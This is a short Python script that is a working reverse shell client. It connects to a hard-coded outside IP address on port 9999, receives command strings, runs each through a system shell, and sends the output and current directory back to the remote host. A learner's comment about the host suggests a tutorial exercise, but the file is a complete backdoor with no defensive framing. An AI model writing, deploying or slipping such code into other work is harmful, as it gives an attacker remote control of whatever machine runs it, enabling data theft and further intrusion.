import socket
import os
import subprocess

s=socket.socket()
host='3.88.69.136'  #I HAVE SOME DOUBTS HERE
port=9999  #server and client port must be same

s.connect((host,port))

while True:
    data=s.recv(1024)
    if data[:2].decode('utf-8')=='cd':
        os.chdir(data[3:].decode('utf-8'))
    
    if len(data)>0:
        cmd=subprocess.Popen(data[:].decode('utf-8'),shell='True',stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte=cmd.stdout.read()+cmd.stderr.read()
        output_str=str(output_byte,'utf-8')
        currentWD=os.getcwd()+"> "
        s.send(str.encode(output_str+currentWD))
        
        print(output_str)
